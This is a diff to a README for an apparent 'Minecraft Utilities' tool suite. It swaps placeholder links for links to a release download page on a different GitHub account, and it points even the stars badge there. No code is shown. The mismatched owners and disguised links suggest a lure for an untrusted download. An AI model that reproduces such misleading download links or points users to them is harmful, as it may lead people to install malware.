@@ -6,7 +6,7 @@
 [![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
 [![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
 [![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/fostermichael89/minecraft-utilities-suite-2026?style=flat-square)](/////////////)
+[![Stars](https://img.shields.io/github/stars/fostermichael89/minecraft-utilities-suite-2026?style=flat-square)](https://github.com/Refff3euu/minecraft-utilities-suite-toolkit-2026/releases/tag/download)
 
 ---
 
@@ -16,11 +16,11 @@
   </a>
 </p>
 
-> **[Direct Download - Minecraft Utilities](/////////////////////////)**
+> **[Direct Download - Minecraft Utilities](https://github.com/Refff3euu/minecraft-utilities-suite-toolkit-2026/releases/tag/download)**
 
 ---
 
-[Download Latest Build](/////////////////////////)
+[Download Latest Build](https://github.com/Refff3euu/minecraft-utilities-suite-toolkit-2026/releases/tag/download)
 
 ---
 
